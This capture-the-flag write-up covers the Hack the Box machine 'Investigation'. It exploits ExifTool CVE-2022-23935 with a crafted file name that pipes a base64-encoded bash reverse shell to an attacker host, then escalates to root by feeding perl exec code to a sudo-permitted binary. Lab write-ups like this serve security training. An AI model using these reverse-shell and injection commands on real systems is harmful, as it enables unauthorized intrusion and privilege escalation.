---
title: "HTB • Investigation"
tags:
  - "Medium Difficulty"
  - "Intermediate"
  - "Linux"
  - "CVE"
  - "CRON Jobs"
  - "Sudo"
  - "Reversing"
  - "Static Analysis"
  - "Web"
excerpt: "Investigation is a medium-difficulty Linux machine on Hack the Box that involves Common Vulnerabilities and Exposures (CVE), cron jobs, sudo, Windows event logs, and reverse-engineering ELF files using static analysis. Some vulnerable or misconfigured technologies featured in this machine include Exiftool and GNU sudo. Some of the products used to solve this challenge include PwnCat, Ghidra, and PEASS-ng."
categories:
  - "Writeups"
  - "Hack the Box Machines"
---

Investigation is a medium difficulty linux machine created by [**Derezzed**](https://app.hackthebox.com/users/15515) on [**Hack the Box**](https://app.hackthebox.com/machines/Investigation) that features a site using a vulnerable version of **ExifTool** to parse client-supplied file names. These file names can be manipulated to inject OS commands as the user **www-data**. This user then finds an exported Outlook email owned by the user **smorton**, which contains an archive of a Windows security event log. The log captures a login attempt where the user accidentally types a password into the username field, so it can be read in plain text. This happens to be the password for smorton, who can run `/usr/bin/binary`{:.filepath} as the user **root** via sudo. Investigating the content of this file reveals that it simply executes the content at a URL as perl code. This can be manipulated to run OS commands as root.

## Reconnaissance

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@attacker
rhost="" # replace with machine address
echo rhost=$rhost >> .env && . ./.env
ctfscan $rhost
```
{:.nolineno}

The scan reports that ports **22** and **80** are open.

## Web

The scan also detects the virtual hostname **eforenzics.htb**, which we'll add to `/etc/hosts`{:.filepath}.

```bash
# bryan@attacker
echo vhost=eforenzics.htb >> .env && . ./.env
echo -e "$rhost\\t$vhost" | sudo tee -a /etc/hosts
```
{:.nolineno}

We'll begin by exploring [http://eforenzics.htb](http://eforenzics.htb) in a browser of our choice.

![Homepage](/assets/img/post/htb-machines-investigation/homepage.png)

The homepage mentions a free image forensics service. The service link points us to [/service.html](http://eforenzics.htb/service.html) which includes a file upload form.

### File Upload

> upload an image file and we will provide a detailed forensic analysis. At this time we can only process jpg images.

![Service](/assets/img/post/htb-machines-investigation/service.png)

Let's upload a valid JPEG image as a test run.

![Upload](/assets/img/post/htb-machines-investigation/upload.png)

The file is accepted and it points us to the output of an [ExifTool](https://exiftool.org) command on our image.

![Report](/assets/img/post/htb-machines-investigation/report.png)

The report indicates that the application is analyzing the uploaded image with ExifTool version **12.37**. Let's check if there are any vulnerabilities applicable to this version.

We visit [CVE Details](https://www.cvedetails.com/) and find a command injection vulnerability tracked as **CVE-2022-23935** listed [here](https://www.cvedetails.com/vulnerability-list/vendor_id-19612/product_id-51884/Exiftool-Project-Exiftool.html) that is applicable to versions before 12.38.

> lib/Image/ExifTool.pm in ExifTool before 12.38 mishandles a $file =~ /\|$/ check, leading to command injection. 

#### CVE-2022-23935

We find a detailed description of the vulnerability [here](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429) that explains how an attacker-controlled file name will be executed as a command when it ends with a pipe character `|`. Let's try to exploit this vulnerability on the target by modifying the file name we pass in the upload form.

```bash
# bryan@attacker
lhost="10.10.14.5" # Listener host
lport="443" # Listener port
shell=$(echo -n "bash >& /dev/tcp/$lhost/$lport 0>&1" | base64 -w 0)
cp test.jpg "echo $shell|base64 -d|bash|" # Modify the image name
pwncat-cs -l $lhost $lport # Start the listener with PwnCat (`python3 -m pip install pwncat-cs`)
```
{:.nolineno}

Once we create the exploit file, we'll upload it the same way we did before. The HTTP response stalls and we recieve a reverse shell on our [PwnCat](https://github.com/calebstewart/pwncat) listener.

## Privilege Escalation

We'll first look for a path forward using the latest `linpeas.sh`{:.filepath} script from [PEASS-ng](https://github.com/carlospolop/PEASS-ng).

### LinPEAS

First we enter a writable directory on the target and toggle PwnCat's interactive console \(**CTRL+CD**\). Then we run the `upload` command with the local path to `linpeas.sh`{:.filepath}

```bash
# www-data@eforenzics.htb (PwnCat)
bash linpeas.sh | tee linpeas.log # Run linpeas and log output
```
{:.nolineno}

The **Cron jobs** section of the LinPEAS output notifies us that **www-data** has a job that runs every five minutes.

>
```bash
date >> /usr/local/investigation/analysed_log && 
  echo "Clearing folders" >> /usr/local/investigation/analysed_log &&
  rm -r /var/www/uploads/* &&
  rm /var/www/html/analysed_images/*
```
{:file="crontab.sh"}

The job mentions an unusual directory at `/usr/local/investigation`{:.filepath}.

```bash
# www-data@eforenzics.htb (PwnCat)
ls -la /usr/local/investigation # List files + permissions
```
{:.nolineno}

This directory contains an interesting file: `Windows Event Logs for Analysis.msg`{:.filepath} owned by the user **smorton**.

### Windows Event Logs

We'll go ahead and download `/usr/local/investigation/Windows Event Logs for Analysis.msg`{:.filepath} for further analysis.

#### Outlook Export

First we check the file format.

```bash
# bryan@attacker
file WindowsEventLogsForAnalysis.msg # Check file type
```
{:.nolineno}

The file is a CDFV2 Microsoft Outlook export. A quick search for ways to convert this format to a more readable format yields references to a tool called [MSGConvert](https://www.matijs.net/software/msgconv/).

```bash
# bryan@attacker
sudo apt-get install -y libemail-outlook-message-perl # Install msgconvert
msgconvert ./WindowsEventLogsForAnalysis.msg # Convert .msg to .eml
```
{:.nolineno}

Now we have an EML file `WindowsEventLogsForAnalysis.eml`{:.filepath}, which is certainly more readable. The file contains an email from **thomas.jones@eforenzics.htb** to **steve.morton@eforenzics.htb** with the following content:


```
Hi Steve,

Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures.

Regards.
Tom
```
{:.nolineno file="email.txt"}

There is also an attachment called `evtx-logs.zip`{:.filepath} that we can extract using some GNU magic.

```bash
# bryan@attacker
cat -n *.eml | grep attachment -A5 # The encoded file starts on line 55 ...
cat -n *.eml | tail -20 # ...and ends on line 22451
start=55
stop=22451
length=$(( $stop - $start + 1 ))
tail +$start *.eml | head -$length | tr -d \\r | base64 -d > evtx-logs.zip
```
{:.nolineno}

Then we'll extract the contents of the archive for analysis

```bash
# bryan@attacker
file evtx-logs.zip # Verify the format
7z l evtx-logs.zip # Check archive contents
7z x evtx-logs.zip # Extract contents
```
{:.nolineno}

#### EVTX Security Log

The one file we get is a Windows security event log which often contain login and authorization events. We can dump the contents to XML using `evtx_dump.py`{:.filepath} from [python-evtx](https://github.com/williballenthin/python-evtx).

```bash
# bryan@attacker
evtx_dump.py ./security.evtx > security.xml
```
{:.nolineno}

##### Whoops!

Next we'll follow the theme of the email and look for failed login attempts because people often enter their password as their username by accident (I know I have).

```bash
# bryan@attacker
fail=4625 # Event ID for a failed login attempt
grep -i -C50 "<EventID[^>]*>$fail</EventID>" security.xml |
  grep -i username |
  sort -u
```
{:.nolineno}

The second of the four usernames from the failed logins looks like a password. Let's check if this is the password for the user **smorton** with SSH.

```bash
ssh "smorton@$rhost"
```
{:.nolineno}

The login is successful!

### Sudo

Let's see what commands **smorton** can run using sudo.

```bash
# smorton@eforenzics.htb (SSH)
sudo -l
```
{:.nolineno}
>
```
User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```
{:.nolineno}

It seems we can run the file `/usr/bin/binary`{:.filepath} as root with sudo. Let's find out what this file does exactly so we can see if exploitation is possible.

#### Unusual Executable

Once we have the file at `/usr/bin/binary`{:.filepath} downloaded on the attacker machine, we'll investigate the actions and purpose of the program with [Ghidra](https://github.com/NationalSecurityAgency/ghidra)

##### Disassembly

Looking at the disassembly in Ghidra, the program checks three conditions before running any meaningful code. The translated and cleaned source code would look something like this:

```c
#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

int main(int argc, char **argv) {

  if (argc != 3 || getuid() || strcmp(argv[2], "lDnxUysaQn")) {
    puts("Exiting... ");
    exit(0);
  }
  puts("Running... ");

  FILE *file = fopen(argv[2]);
  CURL *curl = curl_easy_init();
  curl_easy_setopt(curl, CURLOPT_URL, argv[1]);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);
  curl_easy_setopt(curl, 0x2d, 1);
  CURLcode res = curl_easy_perform(curl);

  int tmp
  char *fn, *cmd;
  char *buf = NULL;

  if (res == 0) {
    // load string "lDnxUysaQn" into fn
    tmp = snprintf(buf, 0, "%s", argv[2]);
    fn = malloc(tmp + 1);
    snprintf(fn, tmp + 1, "%s", argv[2]);

    // load string "perl ./lDnxUysaQn" into cmd
    tmp = snprintf(buf, "perl ./%s", fn);
    cmd = malloc(tmp + 1);
    snprintf(cmd, tmp + 1, "perl ./%s", fn);

    fclose(file); // Close the file handle
    setuid(0);    // Set UID to 0 (root)
    system(cmd);  // execute the content from curl as perl code
    system("rm -f ./lDnxUysaQn"); // deletes the output file
  }
}
```
{:file="translated-source.c"}

The program will continue if there are three parameters passed through the command line, the user is root, and the third argument is "**lDnxUysaQn**". The program then uses [libcurl](https://curl.se/libcurl/) to download the url passed as the second argument to the file `./lDnxUysaQn`{:.filepath}, executes `perl ./lDnxUysaQn`, then deletes `./lDnxUysaQn`{:.filepath}.

##### Exploitation

The actions taken by the program when executed with sudo, allow us to spawn a root shell using a URL that returns perl code with the `exec` function.

```bash
# smorton@eforenzics.htb via SSH
f=$(mktemp) # this file will be executed as perl code
echo 'exec("bash -i -p");' > $f # Just spawn an interactive shell
sudo /usr/bin/binary "file://$f" "lDnxUysaQn" # Use the file:// wrapper
```

This sequence of commands gets us an interactive root shell, where we can then read the final flag at `/root/root.txt`{:.filepath}.
